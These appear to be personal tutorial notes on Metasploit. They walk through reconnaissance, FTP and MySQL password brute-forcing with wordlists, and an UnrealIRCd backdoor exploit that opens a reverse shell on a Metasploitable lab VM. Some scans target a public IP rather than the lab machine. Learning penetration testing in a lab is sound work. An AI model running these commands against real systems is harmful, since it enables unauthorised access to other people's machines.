Metasploit Framework - program with a bunch of built in tools you use (comes with Kali)
- gather information about target
- scan for vulnerabilities
- perform exploits / write your own too
- This is a command line tool

Metasploit.com
http://www.rapid7.com/products/metasploit/
http://www.rapid7.com/products/metasploit/editions.jsp
- This is the company that maintains the core framework/all the exploits & tools
- Paid versions include GUI versions of the tools/reporting features/group collab/etc...
- Free and paid versions both use same core framework & tools (many people prefer CLI)

This is for people who want to check the security of their network or for penetration testers
You can not run exploits on a target/company without permission (you will go to jail)

-------------------- 

Metasploitable 2 - vulnerable test server we can use to practice on (you can run in VM)
http://sourceforge.net/projects/metasploitable/files/Metasploitable2/

Note: if database is not connected, before running msfconsole:
service postgresql start
service metasploit start
msfconsole

Metasploitable
msfadmin
msfadmin

--------------------

Applications > Exploitation Tools > Metasploit Framework

Note: if database is not connected, before running msfconsole:
service postgresql start
service metasploit start
msfconsole

- Overview -
Choose an exploit (tool/something you can do)
Set options
Run attack

We usually want to get shell

--------------------

Basic Usage

# help (available commands and description of what they are used for)
?

# show exploits
show exploits

# search for something
search mysql

# more info about exploit (gives quick overview/description)
info auxiliary/scanner/mysql/mysql_login

# when you are ready to use an exploit
use auxiliary/scanner/mysql/mysql_login

# we arent there yet so lets go back (exit this tool)
back

--------------------

Intelligence Gathering

# run a simple whois (btw always get whois domain privacy)
whois thenewboston.com

# get IP address
host thenewboston.com

# Scan ports (see whats running on the server)
nmap -F 54.186.250.79

--------------------

Find SSH Version

search ssh_verison
info auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_version

show options
set RHOSTS 54.186.250.79
show options
run

--------------------

Crack FTP Password

search ftp_login
info auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/ftp/ftp_login

# Set password list
set RHOSTS 192.168.80.135
set THREADS 30
set USERNAME msfadmin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set PASS_FILE Desktop/passwords.txt
exploit

Ctrl + C (to stop early)

Desktop/passwords.txt
12345
123456
1234567
12345678
abc123
iloveyou
letmein
monkey
msfadmin
password
qwerty
test

--------------------

MySQL Login

use auxiliary/scanner/mysql/mysql_login

set RHOSTS 192.168.80.135
set BLANK_PASSWORDS true
set STOP_ON_SUCCESS true

# Set files
set PASS_FILE Desktop/passwords.txt
set USER_FILE Desktop/users.txt

exploit

--------------------

Get Backdoor

# Search for an exploit
search Unreal 3.2.1.8

# Get more information about an exploit
info exploit/unix/irc/unreal_ircd_3281_backdoor
use exploit/unix/irc/unreal_ircd_3281_backdoor

# set RHOST to Metasploitable IP
show options
set RHOST 198.222.222.2
show options

# set LHOST to Kali IP
show payloads
set payload cmd/unix/reverse
show options
set LHOST 198.115.120.2

# Make sure everything is setup and run exploit
show options
exploit

Notice it says that a session is opened, but then it just gives you a blinking cursor. You are actually sitting in a terminal shell with the target machine!

whoami

--------------------
















